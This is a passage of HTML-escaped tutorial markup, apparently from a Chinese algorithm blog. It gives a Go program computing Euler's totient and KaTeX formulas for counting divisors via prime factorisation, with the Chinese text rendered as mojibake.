class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8804400000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import &amp;quot;fmt&amp;quot;

func main() {
    var n int
    
    fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;n)
    
    for i := 0; i &amp;lt; n; i++ {
        hash := make(map[int]int)
        var tmp int
        fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;tmp)
        var ans int = tmp
        for j := 2; j &amp;lt;= tmp / j; j++ {
            for tmp % j == 0 {
                tmp /= j
                hash[j] ++
            }
        }
        if tmp &amp;gt; 1 {
            hash[tmp] ++
        }
        
        for k, _ := range hash {
            ans = ans / k * (k - 1)
        }
        
        fmt.Println(ans)
        
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;çº¦æ•°&#34;&gt;çº¦æ•°&lt;/h2&gt;
&lt;h3 id=&#34;æ±‚ä¸€ä¸ªæ•°çš„çº¦æ•°çš„ä¸ªæ•°&#34;&gt;æ±‚ä¸€ä¸ªæ•°çš„çº¦æ•°çš„ä¸ªæ•°&lt;/h3&gt;
&lt;p&gt;æ±‚ä¸€ä¸ªæ•°nçš„çº¦æ•°ï¼Œå¯ä»¥ç›´æ¥éå†1~nï¼Œçœ‹èƒ½ä¸èƒ½æ•´é™¤nå³å¯ã€‚&lt;/p&gt;
&lt;p&gt;æ±‚ä¸€ä¸ªå¾ˆå¤§çš„æ•°çš„çº¦æŸçš„ä¸ªæ•°ï¼š&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;åˆ†&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;è§£&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;è´¨&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;å› &lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ•°&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ï¼š&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;åˆ†è§£è´¨å› æ•°ï¼šn = p_{0}^{a_{0}}*p_{2}^{a_{1}}*...*p_{n}^{a_{n}}
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;åˆ†&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;è§£&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;è´¨&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;å› &lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ•°&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ï¼š&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0126em;vertical-align:-0.26630799999999993em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.746292em;&#34;&gt;&lt;span style=&#34;top:-2.433692em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1449em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.26630799999999993em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0126em;vertical-align:-0.26630799999999993em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.746292em;&#34;&gt;&lt;span style=&#34;top:-2.433692em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1449em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.26630799999999993em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.46528em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.9613919999999999em;vertical-align:-0.247em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7143919999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.16454285714285719em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.247em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;å…¶&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ä¸­&lt;/mi&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;çš„&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;çº¦&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ•°&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ä¸º&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ï¼š&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msubsup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;å…±&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ä¸ª&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;å…¶ä¸­p_{0}^{a_{0}}çš„çº¦æ•°ä¸ºï¼š1,p_{0},p_{0}^{2},...,p_{0}^{a_{0}}å…±a_{0}+1ä¸ª
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1304159999999999em;vertical-align:-0.26630799999999993em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;å…¶&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ä¸­&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.746292em;&#34;&gt;&lt;span style=&#34;top:-2.433692em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1449em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.26630799999999993em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;çš„&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;çº¦&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ•°&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ä¸º&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ï¼š&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8641079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.247em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.746292em;&#34;&gt;&lt;span style=&#34;top:-2.433692em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1449em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.26630799999999993em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;å…±&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; 